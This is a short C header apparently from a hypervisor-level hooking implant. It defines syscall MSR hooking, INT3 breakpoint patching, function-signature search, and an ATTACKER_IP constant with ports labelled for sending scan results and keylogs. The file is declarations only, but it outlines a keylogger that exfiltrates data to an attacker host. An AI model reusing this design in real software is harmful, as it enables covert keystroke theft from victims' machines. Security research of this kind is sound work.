#ifndef __HOOKING_H
#define __HOOKING_H

#include <lib/types.h>
#include <vmm/vmm.h>

#define LSTAR_MSR 0xC0000082

#define PUSH_RBP 0x55
#define PUSH_R12 0x5441
#define INT3_OPCODE 0xcc
#define INT3 0x3

#define ATTACKER_IP 0xac1cb73f  // 172.28.183.63
#define SRC_PORT 49321
#define DST_SCAN_PORT 49323
#define DST_KEYLOGS_PORT 49325

#define SEND_TIMER_TIME 0x2ffffff
#define IMMEDIATE_SENDING TRUE

extern uint64_t guest_virtual_to_physical(uint64_t addr);
extern void hook_function(byte_t *func, byte_t **x_page, byte_t *rw_page);
extern uint64_t find_signature(uint64_t addr, byte_t *sign, uint32_t sign_len);

#endif